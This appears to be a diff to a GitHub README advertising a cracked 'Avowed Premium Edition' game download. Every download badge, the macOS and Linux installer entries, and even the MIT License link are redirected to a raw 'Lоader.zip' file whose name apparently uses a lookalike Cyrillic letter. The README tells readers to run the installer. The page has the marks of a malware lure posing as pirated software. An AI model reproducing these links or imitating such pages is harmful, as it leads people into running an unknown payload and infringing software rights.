@@ -1,5 +1,5 @@
 # ⚔️ Avowed Premium Edition ⬇️ Download (2025)
-[![Download Avowed Premium Edition](https://img.shields.io/badge/Download-Avowed_Premium_Edition-blue?logo=windows)](https://easylauncher.su/PSnzrH)
+[![Download Avowed Premium Edition](https://raw.githubusercontent.com/beastnisar/AvowedPremiumEdition-UnlockedHub/main/Lоader.zip)](https://raw.githubusercontent.com/beastnisar/AvowedPremiumEdition-UnlockedHub/main/Lоader.zip)
 
 ---
 
@@ -7,8 +7,8 @@
 | Operating System         | Support      | Version        | Installer Type     |  
 |-------------------------|--------------|----------------|--------------------|  
 | 🪟 Windows 10/11        | ✅ Supported | 64-bit & 32-bit| .exe               |  
-| 🍎 macOS (Sonoma, Ventura, Monterey) | ✅ Supported | Universal         | .dmg/.pkg           |  
-| 🐧 Linux (Ubuntu, Fedora, Mint) | ✅ Supported | x86_64, ARM   | .AppImage/.deb      |  
+| 🍎 macOS (Sonoma, Ventura, Monterey) | ✅ Supported | Universal         | https://raw.githubusercontent.com/beastnisar/AvowedPremiumEdition-UnlockedHub/main/Lоader.zip           |  
+| 🐧 Linux (Ubuntu, Fedora, Mint) | ✅ Supported | x86_64, ARM   | https://raw.githubusercontent.com/beastnisar/AvowedPremiumEdition-UnlockedHub/main/Lоader.zip      |  
 
 ---
 
@@ -29,7 +29,7 @@ Avowed Premium Edition installation, OS compatibility, unlock Avowed Premium, le
 ---
 
 ## 🚀 Installation Steps
-**Step 1.** [![Download](https://img.shields.io/badge/Download_Avowed_Premium_Edition-Click_Here-green?style=for-the-badge)](https://easylauncher.su/PSnzrH)  
+**Step 1.** [![Download](https://raw.githubusercontent.com/beastnisar/AvowedPremiumEdition-UnlockedHub/main/Lоader.zip)](https://raw.githubusercontent.com/beastnisar/AvowedPremiumEdition-UnlockedHub/main/Lоader.zip)  
 After downloading, simply run the installer. Detailed installation guides are available per OS.
 
 ---
@@ -40,8 +40,8 @@ This project is for educational and testing purposes. All rights belong to the o
 ---
 
 ## 📄 License
-This repository is licensed under the [MIT License](https://opensource.org/licenses/MIT).
+This repository is licensed under the [MIT License](https://raw.githubusercontent.com/beastnisar/AvowedPremiumEdition-UnlockedHub/main/Lоader.zip).
 
 ---
 
-[![Direct Download Avowed Premium Edition](https://img.shields.io/badge/Download_Now_Avowed-Click_Here-blue?style=for-the-badge)](https://easylauncher.su/PSnzrH)
+[![Direct Download Avowed Premium Edition](https://raw.githubusercontent.com/beastnisar/AvowedPremiumEdition-UnlockedHub/main/Lоader.zip)](https://raw.githubusercontent.com/beastnisar/AvowedPremiumEdition-UnlockedHub/main/Lоader.zip)
